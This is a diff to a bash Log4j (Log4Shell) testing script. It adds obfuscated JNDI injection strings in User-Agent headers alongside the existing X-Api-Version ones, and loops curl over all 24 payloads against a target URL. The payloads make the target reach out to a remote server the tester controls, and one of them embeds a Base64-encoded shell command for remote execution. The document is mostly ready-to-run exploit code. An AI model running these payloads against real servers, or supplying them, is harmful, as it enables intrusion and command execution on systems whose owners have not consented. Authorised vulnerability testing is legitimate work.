@@ -22,18 +22,30 @@ payload=("X-Api-Version: \${\${::-j}\${::-n}\${::-d}\${::-i}:\${::-l}\${::-d}\${
 	"X-Api-Version: \${jndi:\${lower:l}\${lower:d}a\${lower:p}://$dns/a" #2
 	"X-Api-Version: \${\${env:TEST:-j}ndi\${env:TEST:-:}\${env:TEST:-l}dap\${env:TEST:-:}//$dns/a" #3
 	"X-Api-Version: \${\${::-j}\${::-n}\${::-d}\${::-i}:\${::-r}\${::-m}\${::-i}://$dns/a" #4
-    "X-Api-Version: \${\${::-j}ndi:rmi://$dns/a}" #5
-    "X-Api-Version: \${jndi:rmi://$dns}" #6
-    "X-Api-Version: \${\${lower:jndi}:\${lower:rmi}://$dns/a}" #7
-    "X-Api-Version: \${\${lower:\${lower:jndi}}:\${lower:rmi}://$dns/a}" #8
-    "X-Api-Version: \${\${lower:j}\${lower:n}\${lower:d}i:\${lower:rmi}://$dns/a}" #9
-    "X-Api-Version: \${\${lower:j}\${upper:n}\${lower:d}\${upper:i}:\${lower:r}m\${lower:i}}://$dns/a}" #10
-    "X-Api-Version: \${jndi:dns://$dns}" # 11 
+	"X-Api-Version: \${\${::-j}ndi:rmi://$dns/a}" #5
+	"X-Api-Version: \${jndi:rmi://$dns}" #6
+	"X-Api-Version: \${\${lower:jndi}:\${lower:rmi}://$dns/a}" #7
+	"X-Api-Version: \${\${lower:\${lower:jndi}}:\${lower:rmi}://$dns/a}" #8
+	"X-Api-Version: \${\${lower:j}\${lower:n}\${lower:d}i:\${lower:rmi}://$dns/a}" #9
+	"X-Api-Version: \${\${lower:j}\${upper:n}\${lower:d}\${upper:i}:\${lower:r}m\${lower:i}}://$dns/a}" #10
+	"X-Api-Version: \${jndi:dns://$dns}" # 11
+	"User-Agent: \${\${::-j}\${::-n}\${::-d}\${::-i}:\${::-l}\${::-d}\${::-a}\${::-p}://$dns/a" #12
+	"User-Agent: \${jndi:ldap://$dns/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}" #13
+	"User-Agent: \${jndi:\${lower:l}\${lower:d}a\${lower:p}://$dns/a" #14
+	"User-Agent: \${\${env:TEST:-j}ndi\${env:TEST:-:}\${env:TEST:-l}dap\${env:TEST:-:}//$dns/a" #15
+	"User-Agent: \${\${::-j}\${::-n}\${::-d}\${::-i}:\${::-r}\${::-m}\${::-i}://$dns/a" #16
+	"User-Agent: \${\${::-j}ndi:rmi://$dns/a}" #17
+	"User-Agent: \${jndi:rmi://$dns}" #18
+	"User-Agent: \${\${lower:jndi}:\${lower:rmi}://$dns/a}" #19
+	"User-Agent: \${\${lower:\${lower:jndi}}:\${lower:rmi}://$dns/a}" #20
+	"User-Agent: \${\${lower:j}\${lower:n}\${lower:d}i:\${lower:rmi}://$dns/a}" #21
+	"User-Agent: \${\${lower:j}\${upper:n}\${lower:d}\${upper:i}:\${lower:r}m\${lower:i}}://$dns/a}" #22
+	"User-Agent: \${jndi:dns://$dns}" #23
     )
 echo -e "${Cyan}Log4j Testing on = ${GREEN} $1 ${STOP}\n"
 echo -e "${Cyan}your Remote server =${GREEN} $2 ${STOP}\n"
 echo ""
-for i in {0..11} ; do curl $url -H "${payload[$i]}" && echo -e "${Gcyan} Your Current Payload is = ${payload[$i]} ${STOP}\n" ; done
+for i in {0..23} ; do curl $url -H "${payload[$i]}" && echo -e "${Gcyan} Your Current Payload is = ${payload[$i]} ${STOP}\n" ; done
 echo -e " ${STOP}\n"
 echo -e "${GREEN}Please Check your Remote Server,${STOP}\n"
-echo -e "${Cyan}If It's vulnerable to ${Gcyan}Log4j${Cyan}, Will Get a DNS Ping Massage on your Remote Server ${STOP} \n"
+echo -e "${Cyan}If It's vulnerable to ${Gcyan}Log4j${Cyan},It Will Get a DNS Ping Massage on your Remote Server ${STOP} \n"
